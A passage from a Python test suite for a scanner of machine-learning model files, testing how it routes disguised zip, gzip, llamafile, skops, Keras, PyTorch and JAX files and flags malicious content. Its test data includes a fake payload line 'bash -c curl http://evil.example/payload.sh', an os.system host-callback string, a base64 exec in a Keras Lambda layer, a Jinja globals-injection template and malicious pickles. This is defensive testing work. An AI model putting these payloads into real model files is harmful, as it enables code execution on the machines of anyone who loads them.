        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "ambiguous-small.jpg"
    large_metadata: dict[str, object] = {f"field{i}": i for i in range(2100)}
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(
            {"metadata": large_metadata, "state": {"selected": True}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)

    assert checkpoint.stat().st_size < FLAX_MSGPACK_STRUCTURE_READ_BYTES
    assert result.scanner_name == "flax_msgpack"
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_ambiguous_renamed_msgpack_result_is_not_cached(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "ambiguous.jpg"
    large_metadata: dict[str, object] = {f"field{i}": i for i in range(2100)}
    large_metadata["blob"] = "x" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 100)
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(
            {"metadata": large_metadata, "state": {"selected": True}},
            use_bin_type=True,
        )
    )
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(checkpoint), config=config)
        second = scan_file(str(checkpoint), config=config)

        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_missing_msgpack_result_is_not_cached(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    checkpoint = tmp_path / "model.flax"
    checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }
    monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)

    reset_cache_manager()
    try:
        first = scan_file(str(checkpoint), config=config)
        second = scan_file(str(checkpoint), config=config)

        assert first.success is False
        assert second.success is False
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_missing_yaml_parser_result_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_dir = tmp_path / "model"
    model_dir.mkdir()
    yaml_file = model_dir / "config.yaml"
    yaml_file.write_text("model: safe\n", encoding="utf-8")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }
    monkeypatch.setattr(jinja2_template_scanner, "HAS_YAML", False)

    reset_cache_manager()
    try:
        first = scan_file(str(yaml_file), config=config)
        second = scan_file(str(yaml_file), config=config)

        assert first.scanner_name == "jinja2_template"
        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_oversized_standalone_jinja_result_is_not_cached(tmp_path: Path) -> None:
    template_file = tmp_path / "large.jinja"
    template_file.write_text("{{ content }}" * 10000, encoding="utf-8")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(template_file), config=config)
        second = scan_file(str(template_file), config=config)

        assert first.scanner_name == "jinja2_template"
        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_unreadable_standalone_jinja_result_is_not_cached(tmp_path: Path) -> None:
    template_file = tmp_path / "invalid.jinja"
    template_file.write_bytes(b"{{ cycler.__init__.__globals__ }}\xff")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(template_file), config=config)
        second = scan_file(str(template_file), config=config)

        assert first.scanner_name == "jinja2_template"
        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_still_routes_malicious_zip_with_local_header(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "payload.bin"
    _create_misnamed_zip(disguised_zip, {"payload.pkl": _build_malicious_pickle()})

    assert disguised_zip.read_bytes().startswith(b"PK\x03\x04")

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_directory_preserves_parseable_prefixed_zip_with_central_directory_stub(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "payload.jpg"
    _create_misnamed_zip(disguised_zip, {"payload.pkl": _build_malicious_pickle()})
    _prepend_stub(disguised_zip, b"PK\x01\x02stub-prefix")

    result = scan_model_directory_or_file(str(tmp_path))

    assert any(scanner_name == "zip" for scanner_name in result.scanner_names)
    assert any(
        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    )


@pytest.mark.parametrize("stub", [b"\x7fELF" + b"\x00" * 60, b"MZ" + b"\x00" * 62])
def test_scan_file_preserves_zip_findings_in_llamafile_polyglot(tmp_path: Path, stub: bytes) -> None:
    polyglot = tmp_path / "payload.jpg"
    _create_misnamed_zip(polyglot, {"payload.pkl": _build_malicious_pickle()})
    _prepend_stub(polyglot, stub + b"llamafile runtime\n")

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "llamafile"
    _assert_system_pickle_detected(result, "payload.pkl")


@pytest.mark.parametrize("container_kind", ["pytorch", "executorch", "skops"])
def test_scan_file_preserves_subtype_zip_findings_in_llamafile_polyglot(
    tmp_path: Path,
    container_kind: str,
) -> None:
    polyglot = tmp_path / f"{container_kind}.jpg"
    pickle_member = "payload.pkl"
    entries: dict[str, bytes]
    if container_kind == "pytorch":
        pickle_member = "data.pkl"
        entries = {pickle_member: _build_malicious_pickle(), "version": b"1.6"}
    elif container_kind == "executorch":
        pickle_member = "bytecode.pkl"
        entries = {pickle_member: _build_malicious_pickle(), "version": b"1"}
    else:
        entries = {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.11.0",
                    "content": {},
                }
            ).encode("utf-8"),
            pickle_member: _build_malicious_pickle(),
        }
    _create_misnamed_zip(polyglot, entries)
    _prepend_stub(polyglot, b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n")

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "llamafile"
    _assert_system_pickle_detected(result, pickle_member)
    if container_kind == "skops":
        assert len([issue for issue in result.issues if issue.rule_code == "S201"]) == 1


def test_scan_file_preserves_skops_cve_findings_in_llamafile_polyglot(tmp_path: Path) -> None:
    polyglot = tmp_path / "skops-cve.jpg"
    _create_misnamed_zip(polyglot, {"schema.json": _build_malicious_skops_schema()})
    _prepend_stub(polyglot, b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n")

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "llamafile"
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_file_preserves_skops_cve_findings_in_out_of_window_executable_zip(tmp_path: Path) -> None:
    polyglot = tmp_path / "skops-late-marker.jpg"
    _create_misnamed_zip(polyglot, {"schema.json": _build_malicious_skops_schema()})
    _prepend_stub(
        polyglot,
        b"\x7fELF"
        + b"\x00" * 60
        + b"A" * LLAMAFILE_ROUTE_SCAN_BYTES
        + b"llamafile runtime"
        + b"B" * LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
    )

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "zip"
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_file_benign_llamafile_zip_polyglot_has_no_high_severity(tmp_path: Path) -> None:
    polyglot = tmp_path / "safe.jpg"
    _create_misnamed_zip(polyglot, {"payload.pkl": pickle.dumps({"safe": True})})
    _prepend_stub(polyglot, b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n")

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "llamafile"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_file_fails_closed_when_disguised_llamafile_route_probe_cannot_read(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    payload = tmp_path / "payload.jpg"
    payload.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
    )

    def raise_os_error(_path: Path, _marker: bytes, _limit: int) -> bool:
        raise OSError("synthetic marker probe failure")

    monkeypatch.setattr("modelaudit.utils.file.detection._contains_casefolded_marker_in_prefix", raise_os_error)

    result = scan_file(str(payload), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["operational_error_reason"] == "llamafile_routing_incomplete"
    check = next(check for check in result.checks if check.name == "Llamafile Routing")
    assert "bounded marker bytes could not be read" in check.message

    aggregate = scan_model_directory_or_file(str(payload), cache_scan_results=False)
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_model_omits_phase_timings_by_default(tmp_path: Path) -> None:
    payload = tmp_path / "payload.pkl"
    payload.write_bytes(pickle.dumps({"weights": [1, 2, 3]}))

    result = scan_model_directory_or_file(str(payload), cache_scan_results=False)

    assert not hasattr(result, "phase_timings")


def test_scan_model_emits_opt_in_phase_timings(tmp_path: Path) -> None:
    payload = tmp_path / "payload.pkl"
    payload.write_bytes(pickle.dumps({"weights": [1, 2, 3]}))

    result = scan_model_directory_or_file(str(payload), cache_scan_results=False, profile_timings=True)
    phase_timings = result.phase_timings  # type: ignore[attr-defined]

    assert phase_timings.keys() >= {
        "scanner_selection",
        "top_level_hashing",
        "file_scan_dispatch",
        "result_merge",
        "license_metadata",
        "result_consolidation",
        "commercial_use_warnings",
        "aggregate_hash",
    }
    assert all(duration >= 0 for duration in phase_timings.values())


def test_scan_file_detects_misnamed_gzip_wrapped_pickle_by_header(tmp_path: Path) -> None:
    disguised_gzip = tmp_path / "payload.jpg"
    disguised_gzip.write_bytes(gzip.compress(_build_malicious_pickle()))

    result = scan_file(str(disguised_gzip))

    assert result.scanner_name == "compressed"
    routing_checks = [check for check in result.checks if check.name == "Compressed Wrapper Inner Scanner Routing"]
    assert routing_checks
    assert routing_checks[0].details.get("inner_scanner") == "pickle"
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("compressed_wrapper") == f"{disguised_gzip} -> payload.jpg.inner"
        and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    ), f"Expected compressed inner pickle finding, got: {[(i.location, i.message, i.details) for i in result.issues]}"


def test_scan_file_detects_late_pickle_in_misnamed_concatenated_gzip(tmp_path: Path) -> None:
    disguised_gzip = tmp_path / "payload.jpg"
    disguised_gzip.write_bytes(gzip.compress(b"harmless prelude\n") + gzip.compress(_build_malicious_pickle()))

    result = scan_file(str(disguised_gzip))

    assert result.scanner_name == "compressed"
    assert result.metadata["compressed_member_count"] == 2
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("compressed_wrapper") == f"{disguised_gzip} -> payload.jpg.inner#member-2"
        and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    ), (
        "Expected late compressed-member pickle finding, got: "
        f"{[(i.location, i.message, i.details) for i in result.issues]}"
    )


def test_scan_file_does_not_route_compression_magic_near_match_to_compressed(tmp_path: Path) -> None:
    near_match = tmp_path / "payload.jpg"
    near_match.write_bytes(b"\x1f\x00not-a-gzip-stream")

    result = scan_file(str(near_match))

    assert result.scanner_name == "unknown"
    assert not [check for check in result.checks if check.name.startswith("Compressed Wrapper")]
    assert result.issues == []


def test_scan_file_does_not_route_pk_prefix_near_match_to_zip(tmp_path: Path) -> None:
    near_match = tmp_path / "payload.jpg"
    near_match.write_bytes(b"PKNO harmless text")

    result = scan_file(str(near_match))

    assert result.scanner_name == "unknown"
    assert not [check for check in result.checks if "ZIP" in check.name]
    assert result.issues == []


def test_scan_file_detects_shadowed_duplicate_pickle_in_misleading_zip(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "payload.jpg"
    _create_zip_with_ordered_entries(
        disguised_zip,
        [
            ("payload.pkl", _build_malicious_pickle()),
            ("payload.pkl", pickle.dumps({"safe": True})),
        ],
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_detects_malicious_payload_in_skops_via_zip_pipeline(tmp_path: Path) -> None:
    skops_archive = tmp_path / "payload.skops"
    _create_misnamed_zip(skops_archive, {"payload.pkl": _build_malicious_pickle()})

    result = scan_file(str(skops_archive))

    assert result.scanner_name == "skops"
    assert any("payload.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_routes_misnamed_skops_archive_by_schema_content(tmp_path: Path) -> None:
    disguised_skops = tmp_path / "payload.jpg"
    _create_misnamed_zip(
        disguised_skops,
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.11.0",
                    "content": {},
                }
            ).encode("utf-8"),
            "payload.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_skops))

    assert result.scanner_name == "skops"
    assert any("payload.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_routes_misnamed_skops_archive_by_bare_schema_content(tmp_path: Path) -> None:
    disguised_skops = tmp_path / "payload-no-ext-schema.jpg"
    _create_misnamed_zip(
        disguised_skops,
        {
            "nested/schema": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.11.0",
                    "content": {},
                }
            ).encode("utf-8"),
            "payload.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_skops))

    assert result.scanner_name == "skops"
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_does_not_route_nested_bare_schema_near_match_to_skops(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "nested-schema-near-match.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "nested/schema": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "content": {},
                }
            ).encode("utf-8"),
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert not any("CVE-2025-" in check.name for check in result.checks)


def test_scan_file_does_not_route_near_match_schema_zip_to_skops(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "schema.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "content": {},
                }
            ).encode("utf-8"),
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert not any("CVE-2025-" in check.name for check in result.checks)


def test_scan_file_routes_oversized_misnamed_skops_schema_to_skops(tmp_path: Path) -> None:
    disguised_skops = tmp_path / "oversized-schema.jpg"
    schema = {
        "__class__": "Pipeline",
        "__module__": "sklearn.pipeline",
        "__loader__": "ObjectNode",
        "_skops_version": "0.11.0",
        "content": {},
        "padding": "x" * (4 * 1024 * 1024),
    }
    _create_misnamed_zip(
        disguised_skops,
        {
            "schema.json": json.dumps(schema).encode("utf-8"),
            "payload.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_skops))

    assert result.scanner_name == "skops"
    assert any("payload.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_handles_encrypted_skops_schema_without_routing_crash(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "encrypted-schema.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.12.0",
                    "content": {},
                }
            ).encode("utf-8"),
        },
    )
    _mark_zip_entries_encrypted(disguised_zip)

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert any("encrypted" in check.message.lower() for check in result.checks)


def test_scan_file_scans_clean_skops_without_nested_false_positives(tmp_path: Path) -> None:
    skops_archive = tmp_path / "clean.skops"
    _create_misnamed_zip(
        skops_archive,
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.12.0",
                    "content": {},
                }
            ).encode("utf-8"),
            "metadata.json": b'{"name": "clean_model"}',
            "weights.bin": b"model weights",
        },
    )

    result = scan_file(str(skops_archive))

    assert result.scanner_name == "skops"
    assert result.success
    assert not result.issues


def test_scan_file_does_not_route_generic_zip_config_to_keras(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "repo.jpg"
    _create_misnamed_zip(disguised_zip, {"config.json": json.dumps({"model_type": "bert"}).encode("utf-8")})

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert not any(check.name.startswith("Keras ZIP") for check in result.checks)


def test_scan_file_routes_misnamed_keras_zip_by_content(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    malicious_code = "exec(\"print('Malicious!')\")"
    encoded_code = base64.b64encode(malicious_code.encode()).decode()
    config = {
        "class_name": "Functional",
        "config": {
            "layers": [
                {"class_name": "InputLayer", "name": "input_1", "config": {}},
                {
                    "class_name": "Lambda",
                    "name": "lambda_1",
                    "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                },
            ]
        },
    }
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps(config).encode("utf-8"),
            "metadata.json": json.dumps({"keras_version": "3.0.0"}).encode("utf-8"),
        },
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert any("lambda" in issue.message.lower() for issue in result.issues)


def test_scan_file_routes_misnamed_config_only_keras_zip_by_content(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    malicious_code = "exec(\"print('Malicious!')\")"
    encoded_code = base64.b64encode(malicious_code.encode()).decode()
    config = {
        "class_name": "Functional",
        "config": {
            "layers": [
                {"class_name": "InputLayer", "name": "input_1", "config": {}},
                {
                    "class_name": "Lambda",
                    "name": "lambda_1",
                    "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                },
            ]
        },
    }
    _create_misnamed_zip(disguised_keras, {"config.json": json.dumps(config).encode("utf-8")})

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert any("lambda" in issue.message.lower() for issue in result.issues)


def test_scan_file_routes_misnamed_oversized_config_only_keras_zip_by_content(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    malicious_code = "exec(\"print('Malicious!')\")"
    encoded_code = base64.b64encode(malicious_code.encode()).decode()
    config = {
        "class_name": "Functional",
        "config": {
            "layers": [
                {"class_name": "InputLayer", "name": "input_1", "config": {}},
                {
                    "class_name": "Lambda",
                    "name": "lambda_1",
                    "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                },
            ]
        },
        "padding": "A" * (5 * 1024 * 1024),
    }
    with zipfile.ZipFile(disguised_keras, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("config.json", json.dumps(config))

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert any("lambda" in issue.message.lower() for issue in result.issues)


def test_scan_file_does_not_route_misnamed_oversized_generic_config_to_keras(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "repo.jpg"
    generic_config = {
        "model_type": "bert",
        "architectures": ["BertModel"],
        "padding": "A" * (5 * 1024 * 1024),
    }
    with zipfile.ZipFile(disguised_zip, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("config.json", json.dumps(generic_config))

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert not any(check.name.startswith("Keras ZIP") for check in result.checks)


def test_scan_file_recursively_scans_embedded_pickle_in_content_routed_keras_zip(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "payload.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is False
    _assert_system_pickle_detected(result, "payload.pkl")
    assert result.metadata.get("model_class") == "Sequential"


def test_scan_file_scans_shadowed_duplicate_pickle_members_in_content_routed_keras_zip(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    _create_zip_with_ordered_entries(
        disguised_keras,
        [
            ("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8")),
            ("payload.pkl", _build_malicious_pickle()),
            ("payload.pkl", pickle.dumps({"safe": True})),
        ],
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is False
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_content_routed_keras_zip_with_benign_extra_member_stays_clean(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "notes.txt": b"safe archive member",
        },
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is True
    assert result.issues == []


def test_scan_file_content_routed_keras_zip_with_benign_pickle_member_stays_clean(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "weights.pkl": pickle.dumps({"weights": [1, 2, 3], "bias": [0.1, 0.2]}),
        },
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is True
    assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)


def test_scan_file_content_routed_keras_zip_with_duplicate_benign_pickle_members_stays_clean(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    safe_payload = pickle.dumps({"weights": [1, 2, 3], "bias": [0.1, 0.2]})
    _create_zip_with_ordered_entries(
        disguised_keras,
        [
            ("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8")),
            ("weights.pkl", safe_payload),
            ("weights.pkl", safe_payload),
        ],
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is True
    assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)


def test_scan_file_routes_config_only_keras_by_suffix(tmp_path: Path) -> None:
    keras_model = tmp_path / "model.keras"
    _create_misnamed_zip(
        keras_model,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
        },
    )

    result = scan_file(str(keras_model))

    assert result.scanner_name == "keras_zip"
    assert result.success


def test_scan_file_routes_misnamed_pytorch_zip_by_content(tmp_path: Path) -> None:
    disguised_torch = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_torch,
        {
            "data.pkl": _build_malicious_pickle(),
            "version": b"1.6",
        },
    )

    result = scan_file(str(disguised_torch))

    assert result.scanner_name == "pytorch_zip"
    assert any("data.pkl" in (issue.location or "") for issue in result.issues)


@pytest.mark.parametrize(
    ("pickle_member", "storage_member"),
    [("data.pkl", "data/0"), ("archive/data.pkl", "archive/data/0")],
)
def test_scan_file_routes_misnamed_pytorch_zip_with_storage_but_no_metadata(
    tmp_path: Path,
    pickle_member: str,
    storage_member: str,
) -> None:
    disguised_torch = tmp_path / f"metadata-stripped-{pickle_member.replace('/', '-')}.jpg"
    _create_misnamed_zip(
        disguised_torch,
        {
            pickle_member: _build_malicious_pickle(),
            storage_member: b"tensor-storage",
        },
    )

    result = scan_file(str(disguised_torch))

    assert result.scanner_name == "pytorch_zip"
    assert any(pickle_member in (issue.location or "") for issue in result.issues)


@pytest.mark.parametrize(
    ("pickle_member", "near_storage_member"),
    [
        ("data.pkl", "data/readme.txt"),
        ("data.pkl", "data/0abc"),
        ("data.pkl", "data/weights.v2"),
        ("data.pkl", "data/0/readme.txt"),
        ("archive/data.pkl", "archive/data/readme.txt"),
        ("archive/data.pkl", "archive/data/0abc"),
        ("archive/data.pkl", "archive/data/weights.v2"),
        ("archive/data.pkl", "archive/data/0/readme.txt"),
    ],
)
def test_scan_file_does_not_route_generic_data_directory_to_pytorch_zip(
    tmp_path: Path,
    pickle_member: str,
    near_storage_member: str,
) -> None:
    disguised_zip = tmp_path / f"generic-data-dir-{pickle_member.replace('/', '-')}.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            pickle_member: _build_malicious_pickle(),
            near_storage_member: b"not tensor storage",
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    _assert_system_pickle_detected(result, pickle_member)


@pytest.mark.parametrize("suffix", [".pt", ".pth", ".ckpt", ".bin", ".pkl"])
def test_scan_file_routes_zip_backed_torch_suffix_collisions_to_pytorch_zip(
    tmp_path: Path,
    suffix: str,
) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / f"weights{suffix}")

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pytorch_zip"
    assert result.success is True
    assert result.metadata.get("pickle_files")


@pytest.mark.parametrize("suffix", [".pt", ".pth", ".ckpt", ".pkl"])
def test_scan_file_routes_raw_pickle_torch_suffix_collisions_to_pickle(
    tmp_path: Path,
    suffix: str,
) -> None:
    model_path = tmp_path / f"weights{suffix}"
    model_path.write_bytes(pickle.dumps({"weights": [1, 2, 3]}, protocol=4))

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    assert result.success is True


def test_scan_file_routes_jax_pickles_through_jax_specific_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "state.pickle"
    model_path.write_bytes(
        pickle.dumps(
            {
                "framework": "jax",
                "payload": "jax.experimental.io_callback",
            }
        )
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    assert any(
        check.name == "JAX Pattern Security Check"
        and check.status == CheckStatus.FAILED
        and check.details["pattern"] == r"jax\.experimental\.io_callback"
        for check in result.checks
    )


def test_scan_file_routes_malicious_renamed_jax_json_without_routing_ajax_near_match(tmp_path: Path) -> None:
    model_path = tmp_path / "state.jpg"
    native_model_path = tmp_path / "state.checkpoint"
    near_match_path = tmp_path / "ajax.jpg"
    malicious_payload = (" " * 1024) + json.dumps(
        {
            "framework": "jax",
            "payload": "jax.experimental.host_callback.call(os.system, 'id')",
        }
    )
    model_path.write_text(malicious_payload, encoding="utf-8")
    native_model_path.write_text(malicious_payload, encoding="utf-8")
    near_match_path.write_text(
        json.dumps({"framework": "ajax", "payload": "jax.experimental.host_callback.call(os.system, 'id')"}),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})
    native_result = scan_file(str(native_model_path), config={"cache_scan_results": False})
    near_match_result = scan_file(str(near_match_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jax_checkpoint"
    assert native_result.scanner_name == "jax_checkpoint"
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED
        for check in native_result.checks
    )
    assert near_match_result.scanner_name == "unknown"
    assert near_match_result.success is True


def test_scan_file_composes_jax_analysis_for_mxnet_shaped_json(tmp_path: Path) -> None:
    model_path = tmp_path / "jax-mxnet-overlap.jpg"
    model_path.write_text(
        json.dumps(
            {
                "framework": "jax",
                "nodes": [{"op": "null", "name": "data"}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
                "payload": "jax.experimental.host_callback.call(os.system, 'id')",
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_file_composes_jax_analysis_for_xgboost_shaped_json(tmp_path: Path) -> None:
    model_path = tmp_path / "jax-xgboost-overlap.json"
    model_path.write_text(
        json.dumps(
            {
                "framework": "jax",
                "version": [1, 7, 4],
                "learner": {"gradient_booster": {}},
